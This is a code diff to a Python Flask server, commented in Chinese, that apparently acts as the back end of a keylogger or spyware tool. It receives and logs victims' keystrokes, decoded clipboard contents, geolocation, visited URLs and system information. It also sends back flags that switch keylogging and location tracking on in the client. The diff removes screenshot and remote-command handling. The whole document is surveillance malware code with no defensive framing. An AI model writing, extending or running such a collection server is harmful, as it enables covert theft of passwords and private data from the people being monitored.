@@ -28,12 +28,10 @@ for log_type, file_path in log_files.items():
 
 # 示例标志位
 flags = {
-    "screenshots": "false",  # 设置为 "false"，因为不希望截图
     "geolocation": "true",
     "keylog": "true",
     "urls": "true",
     "input": true,
-    "cmd": ""  # 清空 cmd，因为不需要命令
 }
 
 @app.route('/', methods=['POST'])
@@ -44,20 +42,12 @@ def log_data():
         data = json.loads(data)
         log_type = data.get('logtype')
 
-        if log_type == "CMD":
-            # 返回标志位，不记录 CMD 日志
-            return jsonify(flags), 200
-
         if log_type in ["URL", "KEY", "CLIP", "LOC", "OSI", "INPUT"]:
             print(f"Received log: {data}")  # 仅调试输出这几类日志
 
         if log_type == "CLIP":
             # Decode base64 clipboard data
             data['clip'] = base64.b64decode(data['clip']).decode('utf-8')
-
-        if log_type == "IMG":
-            # 不记录 IMG 日志
-            return jsonify({"status": "ignored IMG log"}), 200
 
         if log_type in log_files:
             file_path = log_files[log_type]
